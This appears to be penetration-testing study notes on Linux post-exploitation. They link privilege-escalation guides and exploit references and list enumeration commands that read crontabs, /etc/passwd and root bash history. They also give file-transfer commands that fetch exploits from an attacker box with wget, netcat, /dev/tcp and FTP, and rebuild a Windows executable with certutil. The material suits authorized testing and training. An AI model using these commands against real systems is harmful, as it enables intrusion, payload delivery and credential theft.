# Linux Post Exploitation

## Resources
- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Checklist - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [Sushant 747's Guide (Country dependant - may need VPN)](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

### Exploring Automated Tools
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester
- LinuxPrivChecker: https://github.com/sleventyeleven/linuxprivchecker

### Escalation Path: Kernel Exploits
- Kernel Exploits: https://github.com/lucyoa/kernel-exploits

### Escalation Path: Sudo
- GTFOBins: https://gtfobins.github.io/
- LinuxPrivEscPlayground: https://tryhackme.com/room/privescplayground
- wget example: https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/
- dirsearch: https://github.com/maurosoria/dirsearch
- CMS Made Simple ExploitDB: https://www.exploit-db.com/exploits/46635
- CVE-2019-14287 ExploitDB: https://www.exploit-db.com/exploits/46635
- CVE-2019-18634 GitHub: https://github.com/saleemrashid/sudo-cve-2019-18634

### Escalation Path: Other SUID Escalation
- Nginx Exploit: http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

### Escalation Path: Capabilities
- Priv Esc using Capabilities: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
- SUID vs. Capabilities: https://mn3m.info/posts/suid-vs-capabilities/
- Capabilites Priv Esc w/ OpennSLL and Selinux enabled and enforced: https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

## Commands to Run on Connecting
````bash
ls -latr / 
ls -latr /tmp 
ls -latr . 
ls -latr .. 
ls -latr /root 
ps -elf 
ifconfig 
netstat -auntp 
w 
ls -latr /var/spool/cron 
tail -n 1000 #files in /var/spool/cron/ 
date; date -u 
uname -a 
df 
ls -latr /var/*acc* 
ls -latr /var/*log*/ 
ls -latr /var/log/* 
cat out relevant files #grep for your logged in user account 
ls -la /etc/*syslog* read all the config files 
for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done 
cat /etc/crontab 
ls -la /etc/cron.* 
#As needed, examine the files/scripts shown in the directory listing of the cron.* directories 
find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -{duration since initial connection} -type f -print0 | xargs -0 ls -latr #NOTE there is a "-" a.k.a minus symbol preceding the "<duration since initial connection"> 
sestatus OR getenforce 
cat /root/.bash_history 
cat ~/.bash_history
history
sudo -l
````

## File Transfers
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65 

**Python** 

1. To transfer exploits. On the attack machine run the following in the folder that has the exploit: 

`python -m SimpleHTTPServer `

-or- 

`python3 -m http.server 8081 ([Optional: port]) `

2. On the target machine I pull the file with: 

`wget [attack box ip] :8000/[filename] `

**Linux -> Windows (Base 64)**
***

1.  Copy contents 

`base64 [file] | xclip -selection -clipboard` 

2. On Windows: open notepad, paste and save as txt on desktop 

3. On Windows terminal, cd to desktop run: 

`certutil -decode [file].txt [file].exe` 

**Netcat**
*** 

1. On target host:  

`nc -lvp 8080 > /root/Desktop/transfer.txt` 

2. On attack box:  

`nc [target ip] 8080 < /root/Desktop/transfer.txt`

**File Transfer With /dev/tcp**
***

- Once you send with /dev/tcp it doesnâ€™t wait for any more data. This method is useful for host that does not have NETCAT available. 

1. On target host:  

`nc -lp 1111 > file.txt` 

2. On attack box:  

`cat file.txt > /dev/tcp/10.2.0.2/1111` 

**FTP**
***
1. Host the files from your attacker machine: `python -m pyftpdlib 21`
2. Connect to ftp from the target machine: `ftp {attacker IP}`